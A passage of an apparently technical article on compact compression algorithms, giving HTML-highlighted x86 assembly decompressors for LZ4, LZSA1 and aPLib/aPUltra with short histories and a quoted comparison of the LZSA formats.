style=\"color: #A90D91;\">eax</span>,<span style=\"color: #A90D91;\">edi</span>\n    <span style=\"color: #000000;\">lodsd</span>\n    <span style=\"color: #000000;\">xchg</span>    <span style=\"color: #A90D91;\">eax</span>,<span style=\"color: #A90D91;\">ebx</span>         <span style=\"color: #177500;\">;BX = chunk length minus header</span>\n    <span style=\"color: #000000;\">lodsd</span>                   <span style=\"color: #177500;\">;load source buffer</span>\n    <span style=\"color: #000000;\">xchg</span>    <span style=\"color: #A90D91;\">eax</span>,<span style=\"color: #A90D91;\">esi</span>\n    <span style=\"color: #000000;\">add</span>     <span style=\"color: #A90D91;\">ebx</span>,<span style=\"color: #A90D91;\">esi</span>         <span style=\"color: #177500;\">;BX = threshold to stop decompression</span>\n    <span style=\"color: #000000;\">xor</span>     <span style=\"color: #A90D91;\">ecx</span>,<span style=\"color: #A90D91;\">ecx</span>\n<span style=\"color: #000000;\">@@parsetoken:</span>               <span style=\"color: #177500;\">;CX=0 here because of REP at end of loop</span>\n    <span style=\"color: #000000;\">mul</span>     <span style=\"color: #A90D91;\">ecx</span>\n    <span style=\"color: #000000;\">lodsb</span>                   <span style=\"color: #177500;\">;grab token to AL</span>\n    <span style=\"color: #000000;\">mov</span>     <span style=\"color: #A90D91;\">dl</span>,<span style=\"color: #A90D91;\">al</span>           <span style=\"color: #177500;\">;preserve packed token in DX</span>\n<span style=\"color: #000000;\">@@copyliterals:</span>\n    <span style=\"color: #000000;\">shr</span>     <span style=\"color: #A90D91;\">al</span>,<span style=\"color: #1C01CE;\">4</span>            <span style=\"color: #177500;\">;unpack upper 4 bits</span>\n    <span style=\"color: #000000;\">call</span>    <span style=\"color: #000000;\">buildfullcount</span>  <span style=\"color: #177500;\">;build full literal count if necessary</span>\n<span style=\"color: #000000;\">@@doliteralcopy:</span>            <span style=\"color: #177500;\">;src and dst might overlap so do this by bytes</span>\n    <span style=\"color: #000000;\">rep</span>     <span style=\"color: #000000;\">movsb</span>           <span style=\"color: #177500;\">;if cx=0 nothing happens</span>\n<span style=\"color: #177500;\">;At this point, we might be done; all LZ4 data ends with five literals and the</span>\n<span style=\"color: #177500;\">;offset token is ignored.  If we're at the end of our compressed chunk, stop.</span>\n    <span style=\"color: #000000;\">cmp</span>     <span style=\"color: #A90D91;\">esi</span>,<span style=\"color: #A90D91;\">ebx</span>         <span style=\"color: #177500;\">;are we at the end of our compressed chunk?</span>\n    <span style=\"color: #000000;\">jae</span>     <span style=\"color: #000000;\">done</span>            <span style=\"color: #177500;\">;if so, jump to exit; otherwise, process match</span>\n<span style=\"color: #000000;\">@@copymatches:</span>\n    <span style=\"color: #000000;\">lodsw</span>                   <span style=\"color: #177500;\">;AX = match offset</span>\n    <span style=\"color: #000000;\">xchg</span>    <span style=\"color: #A90D91;\">edx</span>,<span style=\"color: #A90D91;\">eax</span>         <span style=\"color: #177500;\">;AX = packed token, DX = match offset</span>\n    <span style=\"color: #000000;\">and</span>     <span style=\"color: #A90D91;\">al</span>,<span style=\"color: #1C01CE;\">0Fh</span>          <span style=\"color: #177500;\">;unpack match length token</span>\n    <span style=\"color: #000000;\">call</span>    <span style=\"color: #000000;\">buildfullcount</span>  <span style=\"color: #177500;\">;build full match count if necessary</span>\n<span style=\"color: #000000;\">@@domatchcopy:</span>\n    <span style=\"color: #000000;\">push</span>    <span style=\"color: #A90D91;\">esi</span>             <span style=\"color: #177500;\">;ds:si saved, xchg with ax would destroy ah</span>\n    <span style=\"color: #000000;\">mov</span>     <span style=\"color: #A90D91;\">esi</span>,<span style=\"color: #A90D91;\">edi</span>\n    <span style=\"color: #000000;\">sub</span>     <span style=\"color: #A90D91;\">esi</span>,<span style=\"color: #A90D91;\">edx</span>\n    <span style=\"color: #000000;\">add</span>     <span style=\"color: #A90D91;\">ecx</span>,<span style=\"color: #1C01CE;\">4</span>           <span style=\"color: #177500;\">;minmatch = 4</span>\n                            <span style=\"color: #177500;\">;Can't use MOVSWx2 because [es:di+1] is unknown</span>\n    <span style=\"color: #000000;\">rep</span>     <span style=\"color: #000000;\">movsb</span>           <span style=\"color: #177500;\">;copy match run if any left</span>\n    <span style=\"color: #000000;\">pop</span>     <span style=\"color: #A90D91;\">esi</span>\n    <span style=\"color: #000000;\">jmp</span>     <span style=\"color: #000000;\">@@parsetoken</span>\n<span style=\"color: #000000;\">buildfullcount:</span>\n                            <span style=\"color: #177500;\">;CH has to be 0 here to ensure AH remains 0</span>\n    <span style=\"color: #000000;\">cmp</span>     <span style=\"color: #A90D91;\">al</span>,<span style=\"color: #1C01CE;\">0Fh</span>          <span style=\"color: #177500;\">;test if unpacked literal length token is 15?</span>\n    <span style=\"color: #000000;\">xchg</span>    <span style=\"color: #A90D91;\">ecx</span>,<span style=\"color: #A90D91;\">eax</span>         <span style=\"color: #177500;\">;CX = unpacked literal length token; flags unchanged</span>\n    <span style=\"color: #000000;\">jne</span>     <span style=\"color: #000000;\">builddone</span>       <span style=\"color: #177500;\">;if AL was not 15, we have nothing to build</span>\n<span style=\"color: #000000;\">buildloop:</span>\n    <span style=\"color: #000000;\">lodsb</span>                   <span style=\"color: #177500;\">;load a byte</span>\n    <span style=\"color: #000000;\">add</span>     <span style=\"color: #A90D91;\">ecx</span>,<span style=\"color: #A90D91;\">eax</span>         <span style=\"color: #177500;\">;add it to the full count</span>\n    <span style=\"color: #000000;\">cmp</span>     <span style=\"color: #A90D91;\">al</span>,<span style=\"color: #1C01CE;\">0FFh</span>         <span style=\"color: #177500;\">;was it FF?</span>\n    <span style=\"color: #000000;\">je</span>      <span style=\"color: #000000;\">buildloop</span>       <span style=\"color: #177500;\">;if so, keep going</span>\n<span style=\"color: #000000;\">builddone:</span>\n    <span style=\"color: #000000;\">ret</span>\n<span style=\"color: #000000;\">done:</span>\n    <span style=\"color: #000000;\">sub</span>     <span style=\"color: #A90D91;\">edi</span>,[<span style=\"color: #A90D91;\">esp</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">32</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">4</span>]<span style=\"color: #177500;\">;subtract original offset from where we are now</span>\n    <span style=\"color: #000000;\">mov</span>     [<span style=\"color: #A90D91;\">esp</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">28</span>], <span style=\"color: #A90D91;\">edi</span>\n    <span style=\"color: #000000;\">popad</span>\n    <span style=\"color: #000000;\">ret</span>\n</pre>\n</div>\n<h2 id=\"lzsa\">8.3 LZSA</h2>\n<p>Designed by <a href=\"https://github.com/emmanuel-marty\">Emmanuel Marty</a> with participation from Introspec and <a href=\"https://github.com/emmanuel-marty/lzsa\">published in 2018</a>. <a href=\"https://cpcrulez.fr/forum/viewtopic.php?f=4&amp;t=6237&amp;start=15#p54737\">Introspec explains</a> the difference between the two formats, LZSA1 and LZSA2.</p>\n<p><strong>LZSA1 is designed to directly compete with LZ4. If you compress using &#8220;lzsa -f1 -r INPUT OUTPUT&#8221;, you are very likely to get higher compression ratio than LZ4 and probably slightly lower decompression speed compared to LZ4 (I am comparing speeds of LZSA1 fast decompressor and LZ4 fast decompressor, both hand-tuned by myself). If you really want to compete with LZ4 on speed, you need to compress using one of the &#8220;boost&#8221; options &#8220;lzsa -f1 -r -m4 INPUT OUTPUT&#8221; (better ratio, similar speed to LZ4) or &#8220;lzsa -f1 -r -m5 INPUT OUTPUT&#8221; (similar ratio, faster decompression than LZ4).</strong></p>\n<p><strong>LZSA2 is approximately in the same league as <a href=\"https://www.teambomba.net/bombaman/downloadd26a.html\">BitBuster</a> or ZX7. It&#8217;s likely to be worse if you&#8217;re compressing pure graphics (at least this is what we are seeing on ZX Spectrum), but it has much larger window and is pretty decent at compressing mixed data (e.g. a complete game binary or something similar). We accepted that the compression ratio is not the best because we wanted to preserve some of its speed. You should expect LZSA2 to decompress data about 50% faster than best I can do for ZX7. I did not do tests on BitBuster, but I just had a look at decompressor for ver.1.2 and there is no way it can compete with LZSA2 on speed.</strong></p>\n<div class=\"highlight\" style=\"background: #ffffff;\">\n<pre style=\"line-height: 125%;\"><span></span><span style=\"color: #000000;\">lzsa1_decompress:</span>\n<span style=\"color: #000000;\">_lzsa1_decompress:</span>\n    <span style=\"color: #000000;\">pushad</span>\n    \n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">edi</span>, [<span style=\"color: #A90D91;\">esp</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">32</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">4</span>]    <span style=\"color: #177500;\">; edi = outbuf</span>\n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">esi</span>, [<span style=\"color: #A90D91;\">esp</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">32</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">8</span>]    <span style=\"color: #177500;\">; esi = inbuf</span>\n    \n    <span style=\"color: #000000;\">xor</span>    <span style=\"color: #A90D91;\">ecx</span>, <span style=\"color: #A90D91;\">ecx</span>\n<span style=\"color: #000000;\">.decode_token:</span>\n    <span style=\"color: #000000;\">mul</span>    <span style=\"color: #A90D91;\">ecx</span>\n    <span style=\"color: #000000;\">lodsb</span>                     <span style=\"color: #177500;\">; read token byte: O|LLL|MMMM</span>\n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">dl</span>, <span style=\"color: #A90D91;\">al</span>             <span style=\"color: #177500;\">; keep token in dl</span>\n   \n    <span style=\"color: #000000;\">and</span>    <span style=\"color: #A90D91;\">al</span>, <span style=\"color: #1C01CE;\">070H</span>           <span style=\"color: #177500;\">; isolate literals length in token (LLL)</span>\n    <span style=\"color: #000000;\">shr</span>    <span style=\"color: #A90D91;\">al</span>, <span style=\"color: #1C01CE;\">4</span>              <span style=\"color: #177500;\">; shift literals length into place</span>\n\n    <span style=\"color: #000000;\">cmp</span>    <span style=\"color: #A90D91;\">al</span>, <span style=\"color: #1C01CE;\">07H</span>            <span style=\"color: #177500;\">; LITERALS_RUN_LEN?</span>\n    <span style=\"color: #000000;\">jne</span>    <span style=\"color: #000000;\">.got_literals</span>      <span style=\"color: #177500;\">; no, we have the full literals count from the token, go copy</span>\n\n    <span style=\"color: #000000;\">lodsb</span>                     <span style=\"color: #177500;\">; grab extra length byte</span>\n    <span style=\"color: #000000;\">add</span>    <span style=\"color: #A90D91;\">al</span>, <span style=\"color: #1C01CE;\">07H</span>            <span style=\"color: #177500;\">; add LITERALS_RUN_LEN</span>\n    <span style=\"color: #000000;\">jnc</span>    <span style=\"color: #000000;\">.got_literals</span>      <span style=\"color: #177500;\">; if no overflow, we have the full literals count, go copy</span>\n    <span style=\"color: #000000;\">jne</span>    <span style=\"color: #000000;\">.mid_literals</span>\n\n    <span style=\"color: #000000;\">lodsw</span>                     <span style=\"color: #177500;\">; grab 16-bit extra length</span>\n    <span style=\"color: #000000;\">jmp</span>    <span style=\"color: #000000;\">.got_literals</span>\n\n<span style=\"color: #000000;\">.mid_literals:</span>\n    <span style=\"color: #000000;\">lodsb</span>                     <span style=\"color: #177500;\">; grab single extra length byte</span>\n    <span style=\"color: #000000;\">inc</span>    <span style=\"color: #A90D91;\">ah</span>                 <span style=\"color: #177500;\">; add 256</span>\n\n<span style=\"color: #000000;\">.got_literals:</span>\n    <span style=\"color: #000000;\">xchg</span>   <span style=\"color: #A90D91;\">ecx</span>, <span style=\"color: #A90D91;\">eax</span>\n    <span style=\"color: #000000;\">rep</span>    <span style=\"color: #000000;\">movsb</span>              <span style=\"color: #177500;\">; copy cx literals from ds:si to es:di</span>\n\n    <span style=\"color: #000000;\">test</span>   <span style=\"color: #A90D91;\">dl</span>, <span style=\"color: #A90D91;\">dl</span>             <span style=\"color: #177500;\">; check match offset size in token (O bit)</span>\n    <span style=\"color: #000000;\">js</span>     <span style=\"color: #000000;\">.get_long_offset</span>\n\n    <span style=\"color: #000000;\">dec</span>     <span style=\"color: #A90D91;\">ecx</span>\n    <span style=\"color: #000000;\">xchg</span>    <span style=\"color: #A90D91;\">eax</span>, <span style=\"color: #A90D91;\">ecx</span>          <span style=\"color: #177500;\">; clear ah - cx is zero from the rep movsb above</span>\n    <span style=\"color: #000000;\">lodsb</span>\n    <span style=\"color: #000000;\">jmp</span>     <span style=\"color: #000000;\">.get_match_length</span>\n\n<span style=\"color: #000000;\">.get_long_offset:</span>\n    <span style=\"color: #000000;\">lodsw</span>                     <span style=\"color: #177500;\">; Get 2-byte match offset</span>\n\n<span style=\"color: #000000;\">.get_match_length:</span>\n    <span style=\"color: #000000;\">xchg</span>    <span style=\"color: #A90D91;\">eax</span>, <span style=\"color: #A90D91;\">edx</span>          <span style=\"color: #177500;\">; edx: match offset  eax: original token</span>\n    <span style=\"color: #000000;\">and</span>     <span style=\"color: #A90D91;\">al</span>, <span style=\"color: #1C01CE;\">0FH</span>           <span style=\"color: #177500;\">; isolate match length in token (MMMM)</span>\n    <span style=\"color: #000000;\">add</span>     <span style=\"color: #A90D91;\">al</span>, <span style=\"color: #1C01CE;\">3</span>             <span style=\"color: #177500;\">; add MIN_MATCH_SIZE</span>\n\n    <span style=\"color: #000000;\">cmp</span>     <span style=\"color: #A90D91;\">al</span>, <span style=\"color: #1C01CE;\">012H</span>          <span style=\"color: #177500;\">; MATCH_RUN_LEN?</span>\n    <span style=\"color: #000000;\">jne</span>     <span style=\"color: #000000;\">.got_matchlen</span>     <span style=\"color: #177500;\">; no, we have the full match length from the token, go copy</span>\n\n    <span style=\"color: #000000;\">lodsb</span>                     <span style=\"color: #177500;\">; grab extra length byte</span>\n    <span style=\"color: #000000;\">add</span>     <span style=\"color: #A90D91;\">al</span>,<span style=\"color: #1C01CE;\">012H</span>           <span style=\"color: #177500;\">; add MIN_MATCH_SIZE + MATCH_RUN_LEN</span>\n    <span style=\"color: #000000;\">jnc</span>     <span style=\"color: #000000;\">.got_matchlen</span>     <span style=\"color: #177500;\">; if no overflow, we have the entire length</span>\n    <span style=\"color: #000000;\">jne</span>     <span style=\"color: #000000;\">.mid_matchlen</span>       \n\n    <span style=\"color: #000000;\">lodsw</span>                     <span style=\"color: #177500;\">; grab 16-bit length</span>\n    <span style=\"color: #000000;\">test</span>    <span style=\"color: #A90D91;\">eax</span>, <span style=\"color: #A90D91;\">eax</span>          <span style=\"color: #177500;\">; bail if we hit EOD</span>\n    <span style=\"color: #000000;\">je</span>      <span style=\"color: #000000;\">.done_decompressing</span> \n    <span style=\"color: #000000;\">jmp</span>     <span style=\"color: #000000;\">.got_matchlen</span>\n\n<span style=\"color: #000000;\">.mid_matchlen:</span>\n    <span style=\"color: #000000;\">lodsb</span>                     <span style=\"color: #177500;\">; grab single extra length byte</span>\n    <span style=\"color: #000000;\">inc</span>     <span style=\"color: #A90D91;\">ah</span>                <span style=\"color: #177500;\">; add 256</span>\n\n<span style=\"color: #000000;\">.got_matchlen:</span>\n    <span style=\"color: #000000;\">xchg</span>    <span style=\"color: #A90D91;\">ecx</span>, <span style=\"color: #A90D91;\">eax</span>          <span style=\"color: #177500;\">; copy match length into ecx</span>\n    <span style=\"color: #000000;\">xchg</span>    <span style=\"color: #A90D91;\">esi</span>, <span style=\"color: #A90D91;\">eax</span>          \n    <span style=\"color: #000000;\">mov</span>     <span style=\"color: #A90D91;\">esi</span>, <span style=\"color: #A90D91;\">edi</span>          <span style=\"color: #177500;\">; esi now points at back reference in output data</span>\n    <span style=\"color: #000000;\">movsx</span>   <span style=\"color: #A90D91;\">edx</span>, <span style=\"color: #A90D91;\">dx</span>           <span style=\"color: #177500;\">; sign-extend dx to 32-bits.</span>\n    <span style=\"color: #000000;\">add</span>     <span style=\"color: #A90D91;\">esi</span>, <span style=\"color: #A90D91;\">edx</span>\n    <span style=\"color: #000000;\">rep</span>     <span style=\"color: #000000;\">movsb</span>             <span style=\"color: #177500;\">; copy match</span>\n    <span style=\"color: #000000;\">xchg</span>    <span style=\"color: #A90D91;\">esi</span>, <span style=\"color: #A90D91;\">eax</span>          <span style=\"color: #177500;\">; restore esi</span>\n    <span style=\"color: #000000;\">jmp</span>     <span style=\"color: #000000;\">.decode_token</span>     <span style=\"color: #177500;\">; go decode another token</span>\n\n<span style=\"color: #000000;\">.done_decompressing:</span>\n    <span style=\"color: #000000;\">sub</span>    <span style=\"color: #A90D91;\">edi</span>, [<span style=\"color: #A90D91;\">esp</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">32</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">4</span>]\n    <span style=\"color: #000000;\">mov</span>    [<span style=\"color: #A90D91;\">esp</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">28</span>], <span style=\"color: #A90D91;\">edi</span>      <span style=\"color: #177500;\">; eax = decompressed size</span>\n    <span style=\"color: #000000;\">popad</span>\n    <span style=\"color: #000000;\">ret</span>                       <span style=\"color: #177500;\">; done</span>\n</pre>\n</div>\n<h2 id=\"aplib\">8.4 aPLib</h2>\n<p>Designed by <a href=\"https://twitter.com/twibsen\">J\u00f8rgen Ibsen</a> and <a href=\"http://ibsensoftware.com/products_aPLib.html\">published</a> in 1998, it continues to remain a closed-source compressor. Fortunately, an open-source version of the compressor called <a href=\"https://github.com/emmanuel-marty/apultra\">aPUltra</a> is available, which was released by <a href=\"https://github.com/emmanuel-marty\">Emmanuel Marty</a> in 2019. The <a href=\"https://github.com/emmanuel-marty/apultra/tree/master/asm/x86\">small compressor</a> in x86 assembly follows.</p>\n<div class=\"highlight\" style=\"background: #ffffff;\">\n<pre style=\"line-height: 125%;\"><span></span><span style=\"color: #000000;\">apl_decompress:</span>\n<span style=\"color: #000000;\">_apl_decompress:</span>\n    <span style=\"color: #000000;\">pushad</span>\n\n<span style=\"color: #633820;\">    %ifdef CDECL</span>\n      <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">esi</span>, [<span style=\"color: #A90D91;\">esp</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">32</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">4</span>]  <span style=\"color: #177500;\">; esi = aPLib compressed data</span>\n      <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">edi</span>, [<span style=\"color: #A90D91;\">esp</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">32</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">8</span>]  <span style=\"color: #177500;\">; edi = output</span>\n<span style=\"color: #633820;\">    %endif</span>\n    \n    <span style=\"color: #177500;\">; === register map ===</span>\n    <span style=\"color: #177500;\">;  al: bit queue</span>\n    <span style=\"color: #177500;\">;  ah: unused, but value is trashed</span>\n    <span style=\"color: #177500;\">; ebx: follows_literal</span>\n    <span style=\"color: #177500;\">; ecx: scratch register for reading gamma2 codes and storing copy length</span>\n    <span style=\"color: #177500;\">; edx: match offset (and rep-offset)</span>\n    <span style=\"color: #177500;\">; esi: input (compressed data) pointer</span>\n    <span style=\"color: #177500;\">; edi: output (decompressed data) pointer</span>\n    <span style=\"color: #177500;\">; ebp: offset of .get_bit </span>\n           \n    <span style=\"color: #000000;\">mov</span>     <span style=\"color: #A90D91;\">al</span>,<span style=\"color: #1C01CE;\">080H</span>         <span style=\"color: #177500;\">; clear bit queue(al) and set high bit to move into carry</span>\n    <span style=\"color: #000000;\">xor</span>     <span style=\"color: #A90D91;\">edx</span>, <span style=\"color: #A90D91;\">edx</span>        <span style=\"color: #177500;\">; invalidate rep offset in edx</span>\n\n    <span style=\"color: #000000;\">call</span>    <span style=\"color: #000000;\">.init_get_bit</span>\n<span style=\"color: #000000;\">.get_dibits:</span>\n    <span style=\"color: #000000;\">call</span>    <span style=\"color: #A90D91;\">ebp</span>             <span style=\"color: #177500;\">; read data bit</span>\n    <span style=\"color: #000000;\">adc</span>     <span style=\"color: #A90D91;\">ecx</span>,<span style=\"color: #A90D91;\">ecx</span>         <span style=\"color: #177500;\">; shift into cx</span>\n<span style=\"color: #000000;\">.get_bit:</span>\n    <span style=\"color: #000000;\">add</span>     <span style=\"color: #A90D91;\">al</span>,<span style=\"color: #A90D91;\">al</span>           <span style=\"color: #177500;\">; shift bit queue, and high bit into carry</span>\n    <span style=\"color: #000000;\">jnz</span>     <span style=\"color: #000000;\">.got_bit</span>        <span style=\"color: #177500;\">; queue not empty, bits remain</span>\n    <span style=\"color: #000000;\">lodsb</span>                   <span style=\"color: #177500;\">; read 8 new bits</span>\n    <span style=\"color: #000000;\">adc</span>     <span style=\"color: #A90D91;\">al</span>,<span style=\"color: #A90D91;\">al</span>           <span style=\"color: #177500;\">; shift bit queue, and high bit into carry</span>\n<span style=\"color: #000000;\">.got_bit:</span>\n    <span style=\"color: #000000;\">ret</span>\n<span style=\"color: #000000;\">.init_get_bit:</span>\n    <span style=\"color: #000000;\">pop</span>     <span style=\"color: #A90D91;\">ebp</span>             <span style=\"color: #177500;\">; load offset of .get_bit, to be used with call ebp</span>\n    <span style=\"color: #000000;\">add</span>     <span style=\"color: #A90D91;\">ebp</span>, <span style=\"color: #000000;\">.get_bit</span> <span style=\"color: #000000;\">-</span> <span style=\"color: #000000;\">.get_dibits</span>\n<span style=\"color: #000000;\">.literal:</span>\n    <span style=\"color: #000000;\">movsb</span>                   <span style=\"color: #177500;\">; read and write literal byte</span>\n<span style=\"color: #000000;\">.next_command_after_literal:</span>\n    <span style=\"color: #000000;\">push</span>    <span style=\"color: #1C01CE;\">03H</span>\n    <span style=\"color: #000000;\">pop</span>     <span style=\"color: #A90D91;\">ebx</span>             <span style=\"color: #177500;\">; set follows_literal(bx) to 3</span>\n    \n<span style=\"color: #000000;\">.next_command:</span>\n    <span style=\"color: #000000;\">call</span>    <span style=\"color: #A90D91;\">ebp</span>             <span style=\"color: #177500;\">; read 'literal or match' bit</span>\n    <span style=\"color: #000000;\">jnc</span>     <span style=\"color: #000000;\">.literal</span>        <span style=\"color: #177500;\">; if 0: literal</span>\n                            \n                            <span style=\"color: #177500;\">; 1x: match</span>\n    <span style=\"color: #000000;\">call</span>    <span style=\"color: #A90D91;\">ebp</span>             <span style=\"color: #177500;\">; read '8+n bits or other type' bit</span>\n    <span style=\"color: #000000;\">jc</span>      <span style=\"color: #000000;\">.other</span>          <span style=\"color: #177500;\">; 11x: other type of match</span>\n                            <span style=\"color: #177500;\">; 10: 8+n bits match</span>\n    <span style=\"color: #000000;\">call</span>    <span style=\"color: #000000;\">.get_gamma2</span>     <span style=\"color: #177500;\">; read gamma2-coded high offset bits</span>\n    <span style=\"color: #000000;\">sub</span>     <span style=\"color: #A90D91;\">ecx</span>,<span style=\"color: #A90D91;\">ebx</span>         <span style=\"color: #177500;\">; high offset bits == 2 when follows_literal == 3 ?</span>\n                            <span style=\"color: #177500;\">; (a gamma2 value is always &gt;= 2, so substracting follows_literal when it</span>\n                            <span style=\"color: #177500;\">; is == 2 will never result in a negative value)</span>\n    <span style=\"color: #000000;\">jae</span>     <span style=\"color: #000000;\">.not_repmatch</span>   <span style=\"color: #177500;\">; if not, not a rep-match</span>\n    <span style=\"color: #000000;\">call</span>    <span style=\"color: #000000;\">.get_gamma2</span>     <span style=\"color: #177500;\">; read match length</span>\n    <span style=\"color: #000000;\">jmp</span>     <span style=\"color: #000000;\">.got_len</span>        <span style=\"color: #177500;\">; go copy</span>\n<span style=\"color: #000000;\">.not_repmatch:</span>\n    <span style=\"color: #000000;\">mov</span>     <span style=\"color: #A90D91;\">edx</span>,<span style=\"color: #A90D91;\">ecx</span>         <span style=\"color: #177500;\">; transfer high offset bits to dh</span>\n    <span style=\"color: #000000;\">shl</span>     <span style=\"color: #A90D91;\">edx</span>,<span style=\"color: #1C01CE;\">8</span>\n    <span style=\"color: #000000;\">mov</span>     <span style=\"color: #A90D91;\">dl</span>,[<span style=\"color: #A90D91;\">esi</span>]        <span style=\"color: #177500;\">; read low offset byte in dl</span>\n    <span style=\"color: #000000;\">inc</span>     <span style=\"color: #A90D91;\">esi</span>\n    <span style=\"color: #000000;\">call</span>    <span style=\"color: #000000;\">.get_gamma2</span>     <span style=\"color: #177500;\">; read match length</span>\n    <span style=\"color: #000000;\">cmp</span>     <span style=\"color: #A90D91;\">edx</span>,<span style=\"color: #1C01CE;\">7D00H</span>       <span style=\"color: #177500;\">; offset &gt;= 32000 ?</span>\n    <span style=\"color: #000000;\">jae</span>     <span style=\"color: #000000;\">.increase_len_by2</span> <span style=\"color: #177500;\">; if so, increase match len by 2</span>\n    <span style=\"color: #000000;\">cmp</span>     <span style=\"color: #A90D91;\">edx</span>,<span style=\"color: #1C01CE;\">0500H</span>       <span style=\"color: #177500;\">; offset &gt;= 1280 ?</span>\n    <span style=\"color: #000000;\">jae</span>     <span style=\"color: #000000;\">.increase_len_by1</span> <span style=\"color: #177500;\">; if so, increase match len by 1</span>\n    <span style=\"color: #000000;\">cmp</span>     <span style=\"color: #A90D91;\">edx</span>,<span style=\"color: #1C01CE;\">0080H</span>       <span style=\"color: #177500;\">; offset &lt; 128 ?</span>\n    <span style=\"color: #000000;\">jae</span>     <span style=\"color: #000000;\">.got_len</span>        <span style=\"color: #177500;\">; if so, increase match len by 2, otherwise it would be a 7+1 copy</span>\n<span style=\"color: #000000;\">.increase_len_by2:</span>\n    <span style=\"color: #000000;\">inc</span>     <span style=\"color: #A90D91;\">ecx</span>             <span style=\"color: #177500;\">; increase length</span>\n<span style=\"color: #000000;\">.increase_len_by1:</span>\n    <span style=\"color: #000000;\">inc</span>     <span style=\"color: #A90D91;\">ecx</span>             <span style=\"color: #177500;\">; increase length</span>\n    <span style=\"color: #177500;\">; copy ecx bytes from match offset edx</span>\n<span style=\"color: #000000;\">.got_len:</span>\n    <span style=\"color: #000000;\">push</span>    <span style=\"color: #A90D91;\">esi</span>             <span style=\"color: #177500;\">; save esi (current pointer to compressed data)</span>\n    <span style=\"color: #000000;\">mov</span>     <span style=\"color: #A90D91;\">esi</span>,<span style=\"color: #A90D91;\">edi</span>         <span style=\"color: #177500;\">; point to destination in edi - offset in edx</span>\n    <span style=\"color: #000000;\">sub</span>     <span style=\"color: #A90D91;\">esi</span>,<span style=\"color: #A90D91;\">edx</span>\n    <span style=\"color: #000000;\">rep</span>     <span style=\"color: #000000;\">movsb</span>           <span style=\"color: #177500;\">; copy matched bytes</span>\n    <span style=\"color: #000000;\">pop</span>     <span style=\"color: #A90D91;\">esi</span>             <span style=\"color: #177500;\">; restore esi</span>\n    <span style=\"color: #000000;\">mov</span>     <span style=\"color: #A90D91;\">bl</span>,<span style=\"color: #1C01CE;\">02H</span>          <span style=\"color: #177500;\">; set follows_literal to 2 (ebx is unmodified by match commands)</span>\n    <span style=\"color: #000000;\">jmp</span>     <span style=\"color: #000000;\">.next_command</span>\n    <span style=\"color: #177500;\">; read gamma2-coded value into ecx</span>\n<span style=\"color: #000000;\">.get_gamma2:</span>\n    <span style=\"color: #000000;\">xor</span>     <span style=\"color: #A90D91;\">ecx</span>,<span style=\"color: #A90D91;\">ecx</span>         <span style=\"color: #177500;\">; initialize to 1 so that value will start at 2</span>\n    <span style=\"color: #000000;\">inc</span>     <span style=\"color: #A90D91;\">ecx</span>             <span style=\"color: #177500;\">; when shifted left in the adc below</span>\n<span style=\"color: #000000;\">.gamma2_loop:</span>\n    <span style=\"color: #000000;\">call</span>    <span style=\"color: #000000;\">.get_dibits</span>     <span style=\"color: #177500;\">; read data bit, shift into cx, read continuation bit</span>\n    <span style=\"color: #000000;\">jc</span>      <span style=\"color: #000000;\">.gamma2_loop</span>    <span style=\"color: #177500;\">; loop until a zero continuation bit is read</span>\n    <span style=\"color: #000000;\">ret</span>\n    <span style=\"color: #177500;\">; handle 7 bits offset + 1 bit len or 4 bits offset / 1 byte copy</span>\n<span style=\"color: #000000;\">.other:</span>\n    <span style=\"color: #000000;\">xor</span>     <span style=\"color: #A90D91;\">ecx</span>,<span style=\"color: #A90D91;\">ecx</span>\n    <span style=\"color: #000000;\">call</span>    <span style=\"color: #A90D91;\">ebp</span>             <span style=\"color: #177500;\">; read '7+1 match or short literal' bit</span>\n    <span style=\"color: #000000;\">jc</span>      <span style=\"color: #000000;\">.short_literal</span>  <span style=\"color: #177500;\">; 111: 4 bit offset for 1-byte copy</span>\n                            <span style=\"color: #177500;\">; 110: 7 bits offset + 1 bit length</span>\n                            \n    <span style=\"color: #000000;\">movzx</span>   <span style=\"color: #A90D91;\">edx</span>,<span style=\"color: #A90D91;\">byte</span>[<span style=\"color: #A90D91;\">esi</span>]   <span style=\"color: #177500;\">; read offset + length in dl</span>\n    <span style=\"color: #000000;\">inc</span>     <span style=\"color: #A90D91;\">esi</span>\n    <span style=\"color: #000000;\">inc</span>     <span style=\"color: #A90D91;\">ecx</span>             <span style=\"color: #177500;\">; prepare cx for length below</span>\n    <span style=\"color: #000000;\">shr</span>     <span style=\"color: #A90D91;\">dl</span>,<span style=\"color: #1C01CE;\">1</span>            <span style=\"color: #177500;\">; shift len bit into carry, and offset in place</span>\n    <span style=\"color: #000000;\">je</span>      <span style=\"color: #000000;\">.done</span>           <span style=\"color: #177500;\">; if zero offset: EOD</span>\n    <span style=\"color: #000000;\">adc</span>     <span style=\"color: #A90D91;\">ecx</span>,<span style=\"color: #A90D91;\">ecx</span>         <span style=\"color: #177500;\">; len in cx: 1*2 + carry bit = 2 or 3</span>\n    <span style=\"color: #000000;\">jmp</span>     <span style=\"color: #000000;\">.got_len</span>\n    <span style=\"color: #177500;\">; 4 bits offset / 1 byte copy</span>\n<span style=\"color: #000000;\">.short_literal:</span>\n    <span style=\"color: #000000;\">call</span>    <span style=\"color: #000000;\">.get_dibits</span>     <span style=\"color: #177500;\">; read 2 offset bits</span>\n    <span style=\"color: #000000;\">adc</span>     <span 